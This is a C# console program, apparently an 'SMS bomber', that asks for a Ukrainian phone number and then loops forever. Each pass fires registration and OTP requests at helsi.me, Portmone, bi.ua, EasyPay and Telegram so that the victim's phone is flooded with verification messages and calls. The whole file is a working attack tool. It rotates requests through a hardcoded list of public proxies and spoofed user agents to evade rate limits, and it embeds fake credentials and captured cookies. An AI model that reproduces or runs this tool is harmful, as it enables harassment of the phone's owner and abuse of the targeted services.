using System;
using System.Net;
using System.Text;
using System.Net.Http.Headers;
using System.Text.RegularExpressions;

internal class envy{

    private static readonly Random random = new Random();

    private static readonly IReadOnlyList<string> userAgents = new List<string>
    {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; OnePlus 7T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 6P Build/N2G48B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 7.1; Nexus 5X Build/N2G48B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Samsung Galaxy S21; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
    };

    private static List<string> proxyList = new List<string>
    {
    "185.226.204.160:5713",
    "103.210.206.26:8080",
    "156.228.116.140:3128",
    "122.52.141.182:8080",
    "162.220.246.225:6509",
    "72.10.160.93:12649",
    "103.218.24.67:58080",
    "188.253.112.218:80",
    "156.228.115.84:3128",
    "58.209.137.169:8089",
    "101.47.31.33:20000",
    "108.170.12.11:80",
    "18.134.236.231:1080",
    "103.163.244.106:1080",
    "101.47.24.160:20000",
    "103.158.162.18:8080",
    "3.10.93.50:3128",
    "103.158.253.162:8199",
    "50.174.7.156:80",
    "104.207.40.42:3128",
    "222.67.12.40:1080",
    "93.184.9.9:1080",
    "165.140.185.179:39593",
    "49.84.134.15:8089",
    "47.238.134.126:81",
    "130.255.160.60:11813",
    "72.10.160.170:10603",
    "8.130.36.245:808",
    "91.241.21.17:9812",
    "41.216.232.213:4153",
    "37.26.86.206:47464",
    "177.125.86.108:8080",
    "101.47.23.173:20000",
    "27.79.164.240:16000",
    "13.37.73.214:3128",
    "104.207.34.233:3128",
    "181.78.6.219:8080",
    "83.168.74.163:8080",
    "51.158.113.139:16379",
    "101.47.137.207:20000",
    "45.225.120.36:40033",
    "15.207.35.241:80",
    "156.228.107.148:3128",
    "5.8.240.93:4153",
    "47.245.117.43:80",
    "104.207.47.7:3128",
    "162.220.246.151:6435",
    "188.132.222.134:8080",
    "154.38.161.76:32456",
    "112.78.40.210:8080",
    "190.220.1.173:35376",
    "93.182.26.66:1080",
    "104.207.48.122:3128",
    "200.71.109.102:999",
    "101.47.17.160:20000",
    "156.228.77.163:3128",
    "103.74.107.215:61308",
    "59.98.4.70:8080",
    "179.99.114.7:8080",
    "202.79.47.194:1080",
    "152.26.229.52:9443",
    "104.207.41.232:3128",
    "34.244.90.35:80",
    "38.45.242.120:999",
    "8.213.129.2:5000",
    "8.221.14188:11"
    };

        static async Task Main(){
        Console.Title = "B O M B E R";
        Console.OutputEncoding = Encoding.UTF8;

        Console.Write("АВТОР ЭТОГО ЧУДА\nhttps://envy0xc0.com (RUSLAN BULATOV)\nВведите номер телефона, в формате: 0631244947: ");
        string phone = "38" + Console.ReadLine();

        if(!Regex.IsMatch(phone, @"^380\d{9}$")){
            Console.WriteLine("Неверный формат номера телефона. Пожалуйста, введите номер в формате: 0631244947.");
            Console.ReadKey();
            return;
        }

        Console.WriteLine($"Обработка номера {phone}...");
        await Task.Delay(2000);
        Console.WriteLine("Процесс завершен. Нажмите любую клавишу для активации атаки.");
        while (!Console.KeyAvailable){
            await Task.Delay(300);
        }
        Console.WriteLine("S T A R T E D");
        for(; ;){

            Task[] requests = new Task[]
            {
                SendRequestAsync("https://helsi.me/api/healthy/v2/accounts/login", HttpMethod.Post, $"{{\"phone\":\"{phone}\",\"platform\":\"PISWeb\"}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://helsi.me/" },
                }),

                SendRequestAsync("https://helsi.me/api/healthy/v2/accounts/send", HttpMethod.Post, $"{{\"phone\":\"{phone}\",\"platform\":\"PISWeb\"}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://helsi.me/" },
                }),


                SendRequestAsync("https://api.portmone.com.ua/auth/v2/registration", HttpMethod.Post, $"{{\"client_id\": \"62608e08adc29a8d6dbc9754e659f125\",\"scope\": \"https://api.portmone.com.ua/auth/client\",\"username\": \"{phone}\",\"password\": \"sdfdfsdfs2323few\",\"email\": \"adsadsasd2211@gmail.com\",\"verificationType\": \"phone_call\",\"attribute1\": \"\\u0420\\u0435\\u0433\\u0438\\u0441\\u0442\\u0440\\u0430\\u0446\\u0438\\u044f \\u043d\\u0430 \\u0441\\u0430\\u0439\\u0442\\u0435 www.portmone.com https://www.portmone.com.ua/auth#signup\",\"verification_required\": true}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://www.portmone.com.ua/" },
                    { "X-App-Uid", "a4242cb9e57b84ff73ed5061b296ece6" },
                }),

                SendRequestAsync("https://bi.ua/api/v1/accounts", HttpMethod.Post, "{\"grand_type\":\"call_code\",\"stage\":\"1\",\"login\":\"амогус\",\"phone\":\"" + phone + "\"}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://bi.ua/ukr/signup/" },
                    { "Language", "uk" },
                    { "Authorization", "Bearer null" },
                    { "Cookie", "advanced-frontend=hdpepdrvghor7912u25i77bv6u; _csrf-frontend=bc0a155f4a22546aea0485eb780398e6b932acb89cb6f70e333b467ee8c4cdc1a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22QZ3UXDo7flFSnsEPvb6cmPJUk5oGBk7L%22%3B%7D" }
                }),
            

                SendRequestAsync("https://auth.easypay.ua/api/check", HttpMethod.Post, $"{{\"phone\": \"{phone}\"}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://auth.easypay.ua/api/check" },
                    { "appid", "e63b0537-bf15-453f-8a02-d49f85261e61" },
                    { "pageid", "663b83ef-bfe9-47d9-809b-98784d37a12c" },
                    { "partnerkey", "easypay-v2" },
                }),

                SendRequestAsync("https://my.telegram.org/auth/send_password", HttpMethod.Post, $"phone=+{phone}", "application/x-www-form-urlencoded", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "X-Requested-With", "XMLHttpRequest" }
                })
            };
            await Task.WhenAll(requests);
            GC.Collect();
        }
    }


    public static string GenerateUserAgent()
    {
        return userAgents[random.Next(userAgents.Count)];
    }

    static async Task SendRequestAsync(string url, HttpMethod method, string data, string mediaType, Dictionary<string, string> headers)
    {
        var proxyAddress = proxyList[random.Next(proxyList.Count)];
        var proxy = new WebProxy(proxyAddress);
        using (HttpClientHandler handler = new HttpClientHandler())
        {
        handler.Proxy = proxy;
        handler.UseProxy = true;
        using (HttpClient httpClient = new HttpClient(handler))
        {
                httpClient.Timeout = TimeSpan.FromSeconds(40);
                httpClient.DefaultRequestHeaders.Add("User-Agent", GenerateUserAgent());

                HttpRequestMessage httpRequest = new HttpRequestMessage(method, url);
                if (data != null)
                {
                    httpRequest.Content = new StringContent(data);
                    httpRequest.Content.Headers.ContentType = new MediaTypeHeaderValue(mediaType);
                }

                foreach (var header in headers)
                {
                    httpRequest.Headers.Add(header.Key, header.Value);
                }

                try
                {
                    HttpResponseMessage httpResponse = await httpClient.SendAsync(httpRequest);
                    string content = await httpResponse.Content.ReadAsStringAsync();
                }
                catch (TaskCanceledException)
                {
                    Console.WriteLine($"[{httpRequest.RequestUri.Host}] Превышено время ответа сервера.");
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[{httpRequest.RequestUri.Host}] Ошибка: {e.Message}");
                }
            }
        }
    }
}
